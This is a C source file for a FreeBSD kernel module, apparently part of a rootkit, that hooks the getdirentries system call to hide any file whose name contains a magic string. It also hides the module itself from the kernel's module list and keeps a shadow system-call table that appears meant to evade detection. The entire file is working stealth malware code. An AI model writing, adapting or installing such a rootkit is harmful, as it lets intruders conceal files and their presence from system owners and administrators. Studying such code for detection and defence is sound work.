#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/sysproto.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>
#include <sys/dirent.h>
#include "kld_hiding.h"
#include "magick.h"
#include "shadow_sysent.h"

#define KLD_NAME T_NAME"_stash"
#define KLD_FILE_NAME T_NAME"_stash.ko"

/*
 * getdirentries system call hook. Hides files that have the magic string
 * defined by T_NAME as part of their filename.
 */
static int getdirentries_hook(struct thread *td, void *syscall_args) {
   struct getdirentries_args *uap;
   uap = (struct getdirentries_args *)syscall_args;
   struct dirent  *dp, *current;
   unsigned int      size, count;
   int error = 0;
   /*
    * Store the directory entries found in fd in buf, and record the number
    * of bytes actually transferred.
    */
   sys_getdirentries(td, syscall_args);
   size = td->td_retval[0];
   /* Does fd actually contain any directory entries? */
   if (size > 0) {
      dp = (struct dirent *)malloc(size, M_TEMP, M_NOWAIT);

      if (dp == NULL) {
         error=-1;
         return error;
      }

      if ((error=copyin(uap->buf, dp, size)) != 0) {
         free(dp, M_TEMP);
         return error;
      }

      current = dp;
      count = size;
      /*
       * Iterate through the directory entries found in fd. Note: The last
       * directory entry always has a record length of zero.
       */
      while ((current->d_reclen != 0) && (count > 0)) {
         count -= current->d_reclen;
         /* Do we want to hide this file? */
         if (strstr((char *)&(current->d_name), T_NAME) != NULL) {
            size -= current->d_reclen;
            /*
             * Copy every directory entry found after T_NAME over T_NAME,
             * effectively cutting it out.
             */
            if (count != 0) {
               memmove(current, (char *)current +
               current->d_reclen, count);
               continue;
            }
         }

         /*
          * Are there still more directory entries to look through?
          */
         if (count != 0) {
            /* Advance to the next record. */
            current = (struct dirent *)((char *)current +
               current->d_reclen);
         }
      }

      /*
       * If T_NAME was found in fd, adjust the "return values" to hide it. If
       * T_NAME wasn't found...don't worry 'bout it.
       */
      td->td_retval[0] = size;

      if ((error=copyout(dp, uap->buf, size)) != 0) {
         free(dp, M_TEMP);
         return error;
      }

      free(dp, M_TEMP);
   }

   return (0);
}

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
#ifndef DEBUG
   kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
#endif
   int error = 0;
   int syscall_num = SYS_getdirentries;
   switch (cmd) {
      case MOD_LOAD:
         shadow_sysent[STASH_INDEX].orig_sy_call = sysent[syscall_num].sy_call;
         INSERT_SHADOW_ENTRY(STASH_INDEX, getdirentries_hook, syscall_num);
         sysent[syscall_num].sy_call = (sy_call_t *) getdirentries_hook;
#ifdef DEBUG
         uprintf("[-] stash module loaded at sys call num %d\n", syscall_num);
#endif
         break;
      case MOD_UNLOAD:
         sysent[syscall_num].sy_call =
            (sy_call_t *)shadow_sysent[STASH_INDEX].orig_sy_call;
         UNDO_SHADOW_ENTRY(STASH_INDEX);
#ifdef DEBUG
         uprintf("[-] stash module unloaded from sys call num %d\n", syscall_num);
#endif
         break;
      default:
         error = EOPNOTSUPP;
         break;
   }

   return (error);
}

static moduledata_t stash_mod = {
   "stash", /* module name */
   load,    /* event handler */
   NULL
};

MODULE_VERSION(stash, 1);
DECLARE_MODULE(stash, stash_mod, SI_SUB_DRIVERS, SI_ORDER_ANY);
MODULE_DEPEND(MODNAME, shdw_sysent_tbl, 1, 1, 1);
